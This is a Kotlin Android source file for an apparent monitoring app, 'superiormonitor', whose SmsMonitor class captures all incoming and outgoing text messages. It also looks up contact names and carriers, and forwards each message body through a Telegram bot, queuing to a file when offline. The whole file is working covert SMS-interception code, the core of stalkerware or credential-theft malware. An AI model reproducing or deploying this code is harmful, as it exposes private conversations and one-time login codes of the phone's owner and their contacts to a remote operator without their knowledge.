package com.system.superiormonitor.monitor

import com.system.superiormonitor.util.LogLevel

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.database.ContentObserver
import android.net.Uri
import android.os.Handler
import android.os.Looper
import android.provider.ContactsContract
import android.provider.Telephony
import android.telephony.SubscriptionManager
import com.system.superiormonitor.bot.TelegramApi
import com.system.superiormonitor.util.LogCategory
import com.system.superiormonitor.util.LogManager
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import kotlinx.coroutines.sync.Mutex
import kotlinx.coroutines.sync.withLock

class SmsMonitor(
    private val context: Context,
    private val onUpdate: (String, String?) -> Boolean
) {
    private val prefsManager = com.system.superiormonitor.data.PrefsManager.getInstance(context)
    private var isRunning = false
    private var monitorJob = Job()
    private var monitorScope = CoroutineScope(Dispatchers.IO + monitorJob)
    private val processMutex = Mutex()

    private val smsReceiver = object : BroadcastReceiver() {
        override fun onReceive(ctx: Context?, intent: Intent?) {
            if (intent?.action == Telephony.Sms.Intents.SMS_RECEIVED_ACTION) {
                LogManager.log(LogCategory.BASIC_UPDATE, "SMS Monitor: Incoming SMS broadcast received.")
                val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
                if (messages.isEmpty()) return
                
                // Get subId from intent extra "subscription", fallback to default
                val subId = intent.getIntExtra("subscription", SubscriptionManager.getDefaultSmsSubscriptionId())
                val carrierName = getCarrierName(subId)
                
                val messagesBySender = messages.groupBy { it.originatingAddress }
                
                monitorScope.launch {
                    for ((sender, msgs) in messagesBySender) {
                        val body = msgs.joinToString("") { it.messageBody }
                        val timestamp = msgs.firstOrNull()?.timestampMillis ?: System.currentTimeMillis()
                        processSms(sender ?: "Unknown", body.trim(), timestamp, carrierName, true)
                    }
                }
            }
        }
    }

    private val smsObserver = object : ContentObserver(Handler(Looper.getMainLooper())) {
        override fun onChange(selfChange: Boolean) {
            super.onChange(selfChange)
            LogManager.log(LogCategory.BASIC_UPDATE, "SMS Monitor: DB change detected. Triggering check in 1s.")
            monitorScope.launch {
                delay(1000) // Small delay to allow DB commit
                processOutgoingSms()
            }
        }
    }

    fun start() {
        if (isRunning) return
        try {
            if (monitorJob.isCancelled) {
                monitorJob = Job()
                monitorScope = CoroutineScope(Dispatchers.IO + monitorJob)
            }
            
            // Baseline ID for outgoing messages
            try {
                if (prefsManager.smsLastProcessedOutgoingId == -1L) {
                    val uri = Uri.parse("content://sms")
                    val projection = arrayOf("_id")
                    context.contentResolver.query(uri, projection, null, null, "date DESC LIMIT 1")?.use { cursor ->
                        if (cursor.moveToFirst()) {
                            prefsManager.smsLastProcessedOutgoingId = cursor.getLong(0)
                        }
                    }
                }
            } catch (e: Exception) {
                // Ignore fallback
                LogManager.log(LogCategory.BASIC_UPDATE, "SMS Monitor Error: Failed to establish baseline ID (${e.message})", LogLevel.ERROR)
            }

            val filter = IntentFilter(Telephony.Sms.Intents.SMS_RECEIVED_ACTION)
            context.registerReceiver(smsReceiver, filter)
            
            context.contentResolver.registerContentObserver(Uri.parse("content://sms"), true, smsObserver)

            isRunning = true
            LogManager.log(LogCategory.BASIC_UPDATE, "SMS Monitor Started (Two-Way Sync).")
        } catch (e: SecurityException) {
            LogManager.log(LogCategory.BASIC_UPDATE, "SMS Monitor Error: Missing Permissions.", LogLevel.ERROR)
        } catch (e: Exception) {
            LogManager.log(LogCategory.BASIC_UPDATE, "SMS Monitor Error: ${e.message}", LogLevel.ERROR)
        }
    }

    fun stop() {
        if (!isRunning) return
        try {
            context.unregisterReceiver(smsReceiver)
            context.contentResolver.unregisterContentObserver(smsObserver)
            monitorJob.cancel()
            isRunning = false
            LogManager.log(LogCategory.BASIC_UPDATE, "SMS Monitor Stopped.")
        } catch (e: Exception) {
            // Ignore if not registered
            LogManager.log(LogCategory.BASIC_UPDATE, "SMS Monitor Error: Shutdown failed (${e.message})", LogLevel.ERROR)
        }
    }

    private fun getCarrierName(subId: Int): String {
        try {
            val sm = context.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as SubscriptionManager
            // Check permission before calling getActiveSubscriptionInfo
            if (context.checkSelfPermission(android.Manifest.permission.READ_PHONE_STATE) == android.content.pm.PackageManager.PERMISSION_GRANTED) {
                val info = sm.getActiveSubscriptionInfo(subId)
                return info?.carrierName?.toString() ?: "Unknown"
            }
        } catch (e: Exception) {
            // Ignore fallback
            LogManager.log(LogCategory.BASIC_UPDATE, "SMS Monitor: Failed to fetch carrier name (${e.message})", LogLevel.ERROR)
        }
        return "Unknown"
    }

    private suspend fun processOutgoingSms() {
        processMutex.withLock {
        val uri = Uri.parse("content://sms")
        val projection = arrayOf("_id", "address", "date", "type", "body", "sub_id")
        
        try {
            context.contentResolver.query(uri, projection, "_id > ?", arrayOf(prefsManager.smsLastProcessedOutgoingId.toString()), "_id ASC")?.use { cursor ->
                while (cursor.moveToNext()) {
                    kotlinx.coroutines.yield()
                    val idIdx = cursor.getColumnIndexOrThrow("_id")
                    val typeIdx = cursor.getColumnIndexOrThrow("type")
                    
                    val id = cursor.getLong(idIdx)
                    val type = cursor.getInt(typeIdx)
                    
                    // type = 2 means Sent Outgoing
                    if (type == 2) {
                        val addressIdx = cursor.getColumnIndexOrThrow("address")
                        val dateIdx = cursor.getColumnIndexOrThrow("date")
                        val bodyIdx = cursor.getColumnIndexOrThrow("body")
                        val subIdIdx = cursor.getColumnIndexOrThrow("sub_id")
                        
                        val address = cursor.getString(addressIdx) ?: "Unknown"
                        val date = cursor.getLong(dateIdx)
                        val body = cursor.getString(bodyIdx) ?: ""
                        val subId = cursor.getInt(subIdIdx)
                        
                        val carrierName = getCarrierName(subId)
                        
                        processSms(address, body.trim(), date, carrierName, false)
                    }
                    
                    if (id > prefsManager.smsLastProcessedOutgoingId) {
                        prefsManager.smsLastProcessedOutgoingId = id
                    }
                }
            }
        } catch (e: Exception) {
            LogManager.log(LogCategory.BASIC_UPDATE, "SMS Monitor Outgoing Check Error: ${e.message}", LogLevel.ERROR)
        }
        }
    }

    private fun getContactName(phoneNumber: String): String? {
        try {
            val uri = Uri.withAppendedPath(ContactsContract.PhoneLookup.CONTENT_FILTER_URI, Uri.encode(phoneNumber))
            val projection = arrayOf(ContactsContract.PhoneLookup.DISPLAY_NAME)
            context.contentResolver.query(uri, projection, null, null, null)?.use { cursor ->
                if (cursor.moveToFirst()) {
                    val nameIndex = cursor.getColumnIndexOrThrow(ContactsContract.PhoneLookup.DISPLAY_NAME)
                    return cursor.getString(nameIndex)
                }
            }
        } catch (e: Exception) {
            // Fallback to null
            LogManager.log(LogCategory.BASIC_UPDATE, "SMS Monitor: Failed to lookup contact name (${e.message})", LogLevel.ERROR)
        }
        return null
    }

    private suspend fun processSms(address: String, body: String, timestampMillis: Long, carrierName: String, isIncoming: Boolean) {
        val contactName = getContactName(address)
        val fromToStr = if (contactName != null) {
            "`$address` | $contactName"
        } else {
            "`$address`"
        }
        
        val formatter = SimpleDateFormat("HH:mm:ss | dd/MM/yy", Locale.getDefault())
        val timeStr = formatter.format(Date(timestampMillis))
        
        val directionType = if (isIncoming) "Incoming" else "Outgoing"
        val headerAction = if (isIncoming) "*Arrived!*" else "*Sent!*"

        val fromOrToLabel = if (isIncoming) "*From*" else "*To*"

        val safeContactName = TelegramApi.escapeMarkdown(contactName ?: "")
        val safeAddress = TelegramApi.escapeMarkdown(address)
        val fromToStrSafe = if (contactName != null) {
            "`$safeAddress` | $safeContactName"
        } else {
            "`$safeAddress`"
        }

        val safeCarrierName = TelegramApi.escapeMarkdown(carrierName)
        val safeBody = TelegramApi.escapeMarkdown(body)

        val output = com.system.superiormonitor.bot.BotMessages.Alerts.buildSmsMessage(
            headerAction, fromOrToLabel, fromToStrSafe, timeStr, safeCarrierName, directionType, safeBody
        )
        
        LogManager.log(LogCategory.BASIC_UPDATE, "SMS: $directionType message processed for $address")

        com.system.superiormonitor.bot.OfflineManager.sendOrQueue(
            context, output, "sms_alrt", "offline_sms.txt", onUpdate
        )
        delay(3000)
    }
}
